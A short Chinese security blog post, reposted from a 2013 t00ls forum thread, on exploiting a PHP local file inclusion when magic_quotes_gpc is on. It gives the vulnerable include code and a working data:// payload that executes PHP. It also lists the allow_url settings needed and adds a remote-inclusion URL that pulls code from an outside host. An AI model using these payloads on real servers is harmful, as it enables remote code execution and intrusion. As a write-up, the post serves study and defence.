---
title: 开启GPC情况下本地包含
date: 2013-11-19 14:50
tags: php
---

>文章于 2013-11-19 发表于**t00ls**
[开启GPC情况下本地包含](https://www.t00ls.net/thread-24941-1-1.html)


漏洞代码:
```php
$langx=$_REQUEST['langx'];
include ($langx.".inc.php");
```
环境：
```text
magic_quotes_gpc        On
allow_url_fopen        On
allow_url_include        On

PHP Version 5.3.3-7
Apache 2.0
Linux debian 2.6.32-5-amd64
```

`GPC` 为`on`
`%00` 截断？  超长 `././` 
都不行

post 或get方式提交
`langx=data://text/plain,<?php phpinfo();?>`

相当于 包含了一个内容为 `<?php phpinfo();?>.inc.php`的文件

所以不用考虑截断
成功执行!

测试：
```
allow_url_fopen        Off  
allow_url_include        On  
```
**包含失败**
```
allow_url_fopen        On    
allow_url_include        Off
```
**包含失败**



依赖条件：
```
allow_url_fopen        On
allow_url_include        On
PHP 5.2.0 以上
```

>利用场景：php 版本过高(大于php5.3.4 NULL截断失效)或开启GPC 导致截取失效, 但恰好服务器 php.ini allow_url_fopen、allow_url_include 都配置为on
不过 很少有服务器同时 开启这两个

更多方式期待大家测试与交流

补充：

远程放一个 `xx.inc.php`
利用：`http://target_site/include.php?xx=http://xxoo.com/xx`
利用场景更宽